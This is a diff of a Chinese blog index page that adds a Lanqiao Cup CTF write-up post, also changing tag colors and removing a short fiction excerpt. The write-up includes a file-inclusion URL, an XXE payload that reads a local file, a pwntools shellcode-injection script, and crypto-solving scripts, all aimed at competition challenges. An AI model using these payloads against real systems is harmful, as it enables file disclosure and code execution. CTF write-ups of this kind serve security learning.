@@ -200,6 +200,255 @@
         
 
 <div class="post">
+    <a href="/2025/04/27/%E8%93%9D%E6%A1%A5%E9%83%A8%E5%88%86%E9%A2%98WriteUp/">
+        <h2 class="post-title">蓝桥部分题WriteUp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/Writeup/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Writeup
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/4/27
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>这是昨天蓝桥杯部分题目的wp。</p>
+<h1 id="黑客密室逃脱"><a href="#黑客密室逃脱" class="headerlink" title="黑客密室逃脱"></a>黑客密室逃脱</h1><p>访问，看到访问了<code>/secret</code>下的<code>d9d1c4d9e0d591d0c8dc679b6f64a6c993a592a8c4a198a6966b6f68a09a9ba49ed6949e9ddf666e9bb4</code></p>
+<p>接下来还有个文件包含漏洞，可以获取到<code>app.py</code>和<code>hidden.txt</code>的内容。</p>
+<p><code>/file?name=app.py</code></p>
+<p><code>/file?name=hidden.txt</code></p>
+<p><code>app.py</code>中有加密逻辑，<code>hidden.txt</code>是key。</p>
+<p>把这些内容用cyberchef数组化，用python写个脚本即可解出</p>
+<pre><code class="language-python">secret_key = [0x73,0x65,0x63,0x72,0x65,0x74,0x5f,0x6b,0x65,0x79,0x35,0x35,0x39,0x37]
+text = [0xd9,0xd1,0xc4,0xd9,0xe0,0xd5,0x91,0xd0,0xc8,0xdc,0x67,0x9b,0x6f,0x64,0xa6,0xc9,0x93,0xa5,0x92,0xa8,0xc4,0xa1,0x98,0xa6,0x96,0x6b,0x6f,0x68,0xa0,0x9a,0x9b,0xa4,0x9e,0xd6,0x94,0x9e,0x9d,0xdf,0x66,0x6e,0x9b,0xb4]
+
+flag = &quot;&quot;
+for i in range(42):
+    flag += chr(text[i]-secret_key[i%14])
+print(flag)
+</code></pre>
+<p>flag{a2ecc2f6-3d03-4e63-a661-5829b538f19b}</p>
+<h1 id="ezEvtx"><a href="#ezEvtx" class="headerlink" title="ezEvtx"></a>ezEvtx</h1><p>打开，筛选出错误和警告，在事件ID4663中即可找到读取的文件。confidential.docx</p>
+<p>flag{confidential.docx}</p>
+<h1 id="flowzip"><a href="#flowzip" class="headerlink" title="flowzip"></a>flowzip</h1><p>strings flowzip.pcapng | grep “flag”即可找到</p>
+<p>flag{c6db63e6-6459-4e75-bb37-3aec5d2b947b}</p>
+<h1 id="星际XML解析器"><a href="#星际XML解析器" class="headerlink" title="星际XML解析器"></a>星际XML解析器</h1><p>XML 外部实体注入漏洞</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM &quot;file://flag&quot;&gt;]&gt;
+&lt;root&gt;&amp;file;&lt;/root&gt;
+</code></pre>
+<p>这个payload解析即可</p>
+<p>flag{d63c2f41-2677-4a89-9e7b-89080cebb603}</p>
+<h1 id="RuneBreach"><a href="#RuneBreach" class="headerlink" title="RuneBreach"></a>RuneBreach</h1><p>直接运行程序，输入4次n后得到了一个地址。不过这个地址似乎并没有什么用</p>
+<p>构造cat flag的code注入进去。</p>
+<pre><code class="language-python">from pwn import *
+context.arch=&#39;amd64&#39;
+p = process(&#39;./chall&#39;)
+#p = remote(&#39;39.105.2.63&#39;, 27510)
+p.sendlineafter(&#39;/N): &#39;, &#39;n&#39;)
+p.sendlineafter(&#39;/N): &#39;, &#39;n&#39;)
+p.sendlineafter(&#39;/N): &#39;, &#39;n&#39;)
+p.sendlineafter(&#39;/N): &#39;, &#39;n&#39;)
+p.recvuntil(&#39; now &#39;)
+exec_area = int(p.recvuntil(&#39;!&#39;)[:-1], 16)
+print(&#39;exec_area:&#39;, hex(exec_area))
+shellcode = asm(shellcraft.cat(&#39;./flag&#39;))
+p.sendline(shellcode)
+p.interactive()
+</code></pre>
+<p>flag{9765b88a-21c0-41d4-bfd0-41acd6994050}</p>
+<h1 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h1><p>使用Cyberchef的enigma即可直接得到</p>
+<p>flag{HELLOCTFERTHISISAMESSAGEFORYOU}</p>
+<h1 id="ShadowPhases"><a href="#ShadowPhases" class="headerlink" title="ShadowPhases"></a>ShadowPhases</h1><p>ida在主函数的<img src="image-20250427135920810.png" alt="image-20250427135920810"></p>
+<p>这里打个断点，开启动态调试，看一下str2的值即可得到flag</p>
+<p>flag{0fa830e7-b699-4513-8e01-51f35b0f3293}</p>
+<h1 id="easy-AES"><a href="#easy-AES" class="headerlink" title="easy_AES"></a>easy_AES</h1><pre><code class="language-python">b = &#123;
+    &#39;7&#39;: [&#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;],
+    &#39;4&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;],
+    &#39;a&#39;: [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;],
+    &#39;e&#39;: [&#39;c&#39;, &#39;d&#39;],
+    &#39;b&#39;: [&#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;],
+    &#39;3&#39;: [&#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;],
+    &#39;5&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;],
+    &#39;6&#39;: [&#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;],
+    &#39;c&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;],
+    &#39;f&#39;: [&#39;7&#39;],
+    &#39;d&#39;: [&#39;c&#39;, &#39;d&#39;, &#39;e&#39;],
+    &#39;1&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;],
+    &#39;9&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;],
+    &#39;0&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;]
+&#125;
+</code></pre>
+<p>候选字典</p>
+<pre><code class="language-python">char_to_num = &#123;f&quot;&#123;i:x&#125;&quot;: i for i in range(16)&#125;
+b_numeric = &#123;&#125;
+for k in b:
+    k_num = char_to_num[k]
+    b_numeric[k_num] = [char_to_num[c] for c in b[k]]
+
+key1_digits = [char_to_num[c] for c in key1_hex]
+
+gift_bin = bin(gift)[2:].zfill(128)
+gift_nibbles = [int(gift_bin[i*4 : (i+1)*4], 2) for i in range(32)]
+</code></pre>
+<p>预处理</p>
+<pre><code class="language-python">from Cryptodome.Cipher import AES
+b = &#123;
+    &#39;7&#39;: [&#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;],
+    &#39;4&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;],
+    &#39;a&#39;: [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;],
+    &#39;e&#39;: [&#39;c&#39;, &#39;d&#39;],
+    &#39;b&#39;: [&#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;],
+    &#39;3&#39;: [&#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;],
+    &#39;5&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;],
+    &#39;6&#39;: [&#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;],
+    &#39;c&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;],
+    &#39;f&#39;: [&#39;7&#39;],
+    &#39;d&#39;: [&#39;c&#39;, &#39;d&#39;, &#39;e&#39;],
+    &#39;1&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;],
+    &#39;9&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;],
+    &#39;0&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;]
+&#125;
+# 题目给出的数据
+gift = 64698960125130294692475067384121553664
+key1_hex = &quot;74aeb356c6eb74f364cd316497c0f714&quot;
+cipher = b&#39;6\xbf\x9b\xb1\x93\x14\x82\x9a\xa4\xc2\xaf\xd0L\xad\xbb5\x0e|&gt;\x8c|\xf0^dl~X\xc7R\xcaZ\xab\x16\xbe r\xf6Pl\xe0\x93\xfc)\x0e\x93\x8e\xd3\xd6&#39;
+
+char_to_num = &#123;f&quot;&#123;i:x&#125;&quot;: i for i in range(16)&#125;
+b_numeric = &#123;&#125;
+for k in b:
+    k_num = char_to_num[k]
+    b_numeric[k_num] = [char_to_num[c] for c in b[k]]
+
+key1_digits = [char_to_num[c] for c in key1_hex]
+
+gift_bin = bin(gift)[2:].zfill(128)
+gift_nibbles = [int(gift_bin[i*4 : (i+1)*4], 2) for i in range(32)]
+
+candidates = []
+for i in range(32):
+    k = key1_digits[i]
+    g = gift_nibbles[i]
+    user_candidates = b_numeric.get(k, list(range(16)))
+    valid_candidates = [c for c in user_candidates if (c &amp; k) == g]
+    candidates.append(valid_candidates)
+
+def solve():
+    used = [False] * 16
+    mapping = &#123;&#125; 
+
+    def backtrack(pos):
+        if pos == 32:
+            key0_digits = [mapping[k] for k in key1_digits]
+            key0_hex = &quot;&quot;.join(f&quot;&#123;c:x&#125;&quot; for c in key0_digits)
+            try:
+                aes0 = AES.new(bytes.fromhex(key0_hex), AES.MODE_CBC, bytes.fromhex(key1_hex))
+                aes1 = AES.new(bytes.fromhex(key1_hex), AES.MODE_CBC, bytes.fromhex(key0_hex))
+                plaintext = aes0.decrypt(aes1.encrypt(cipher))
+                if b&quot;flag&#123;&quot; in plaintext:
+                    print(&quot;Found valid key0:&quot;, key0_hex)
+                    print(&quot;Flag:&quot;, plaintext.decode())
+                    return True
+            except:
+                pass
+            return False
+
+        k = key1_digits[pos]
+        if k in mapping:   
+            return backtrack(pos + 1)
+
+        for c in candidates[pos]:
+            if not used[c]:
+                valid = True
+                for future_pos in range(pos+1, 32):
+                    future_k = key1_digits[future_pos]
+                    if future_k == k:
+                        future_g = gift_nibbles[future_pos]
+                        if (c &amp; future_k) != future_g:
+                            valid = False
+                            break
+                if not valid:
+                    continue
+            
+                used[c] = True
+                mapping[k] = c
+                if backtrack(pos + 1):
+                    return True
+                del mapping[k]
+                used[c] = False
+        return False
+    return backtrack(0)
+
+if not solve():
+    print(&quot;No valid mapping found.&quot;)
+</code></pre>
+<p>flag{886769b5-2301-4c37-bb73-4480b4eab682}</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/Writeup/" style="color: #ff7d73">Writeup</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Misc/" style="color: #00a596">Misc</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Pwn/" style="color: #00bcd4">Pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/CTF/" style="color: #00a596">CTF</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Crypto/" style="color: #03a9f4">Crypto</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Reverse/" style="color: #00a596">Reverse</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Web/" style="color: #ff7d73">Web</a>
+        </span>
+        
+    </div>
+    <a href="/2025/04/27/%E8%93%9D%E6%A1%A5%E9%83%A8%E5%88%86%E9%A2%98WriteUp/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2025/04/13/SQCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWP/">
         <h2 class="post-title">SQCTF部分题目WP</h2>
     </a>
@@ -240,7 +489,7 @@
         
         <span class="tag">
             
-            <a href="/tags/Writeup/" style="color: #ff7d73">Writeup</a>
+            <a href="/tags/Writeup/" style="color: #00a596">Writeup</a>
         </span>
         
         <span class="tag">
@@ -250,12 +499,12 @@
         
         <span class="tag">
             
-            <a href="/tags/Pwn/" style="color: #ff7d73">Pwn</a>
+            <a href="/tags/Pwn/" style="color: #03a9f4">Pwn</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/CTF/" style="color: #03a9f4">CTF</a>
+            <a href="/tags/CTF/" style="color: #00a596">CTF</a>
         </span>
         
         <span class="tag">
@@ -265,12 +514,12 @@
         
         <span class="tag">
             
-            <a href="/tags/Reverse/" style="color: #ff7d73">Reverse</a>
+            <a href="/tags/Reverse/" style="color: #00a596">Reverse</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Web/" style="color: #ffa2c4">Web</a>
+            <a href="/tags/Web/" style="color: #00bcd4">Web</a>
         </span>
         
     </div>
@@ -318,12 +567,12 @@
         
         <span class="tag">
             
-            <a href="/tags/Writeup/" style="color: #00a596">Writeup</a>
+            <a href="/tags/Writeup/" style="color: #03a9f4">Writeup</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #03a9f4">网安</a>
+            <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #ffa2c4">网安</a>
         </span>
         
     </div>
@@ -371,7 +620,7 @@
         
         <span class="tag">
             
-            <a href="/tags/Writeup/" style="color: #03a9f4">Writeup</a>
+            <a href="/tags/Writeup/" style="color: #ff7d73">Writeup</a>
         </span>
         
         <span class="tag">
@@ -424,7 +673,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #00a596">笔记</a>
+            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #ffa2c4">笔记</a>
         </span>
         
     </div>
@@ -472,12 +721,12 @@
         
         <span class="tag">
             
-            <a href="/tags/Writeup/" style="color: #ff7d73">Writeup</a>
+            <a href="/tags/Writeup/" style="color: #00a596">Writeup</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #03a9f4">网安</a>
+            <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #ffa2c4">网安</a>
         </span>
         
     </div>
@@ -527,7 +776,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #00a596">笔记</a>
+            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #ff7d73">笔记</a>
         </span>
         
     </div>
@@ -576,12 +825,12 @@
         
         <span class="tag">
             
-            <a href="/tags/AI/" style="color: #ff7d73">AI</a>
+            <a href="/tags/AI/" style="color: #00a596">AI</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #00a596">笔记</a>
+            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #00bcd4">笔记</a>
         </span>
         
     </div>
@@ -629,7 +878,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E6%9D%82%E9%A1%B9/" style="color: #00bcd4">杂项</a>
+            <a href="/tags/%E6%9D%82%E9%A1%B9/" style="color: #00a596">杂项</a>
         </span>
         
     </div>
@@ -680,59 +929,11 @@
         
         <span class="tag">
             
-            <a href="/tags/%E5%B0%8F%E8%AF%B4/" style="color: #ff7d73">小说</a>
+            <a href="/tags/%E5%B0%8F%E8%AF%B4/" style="color: #03a9f4">小说</a>
         </span>
         
     </div>
     <a href="/2024/12/25/%E5%BC%94%E6%96%87%E2%80%94%E2%80%94%E6%AF%9B%E8%A1%A3/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/12/25/%E5%BC%94%E6%96%87%E2%80%94%E2%80%94%E9%99%88%E6%B1%90%E6%AD%A3%E4%BC%A0/">
-        <h2 class="post-title">弔文——陈汐正传</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="category">
-            <a href="/categories/%E5%B0%8F%E8%AF%B4/">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                小说
-            </a>
-        </span>
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/12/25
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="《陈汐正传》豆瓣评分9-9"><a href="#《陈汐正传》豆瓣评分9-9" class="headerlink" title="《陈汐正传》豆瓣评分9.9"></a>《陈汐正传》豆瓣评分9.9</h1><p>“哈哈哈哈哈，你看这个陈汐，又开始装了！”<br>“哈哈哈哈哈……”教室内外充满了快活的空气。<br>“你们……你们……你们不识好歹！”我恼羞成怒，大喊着。“你们等着，我……我一定…….”<br>“哈哈哈哈哈哈，他又要装了吗？哈哈哈哈……”<br>一气之下，我跑出了教室。</p>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%B0%8F%E8%AF%B4/" style="color: #ff7d73">小说</a>
-        </span>
-        
-    </div>
-    <a href="/2024/12/25/%E5%BC%94%E6%96%87%E2%80%94%E2%80%94%E9%99%88%E6%B1%90%E6%AD%A3%E4%BC%A0/" class="go-post">阅读全文</a>
 </div>
 
 
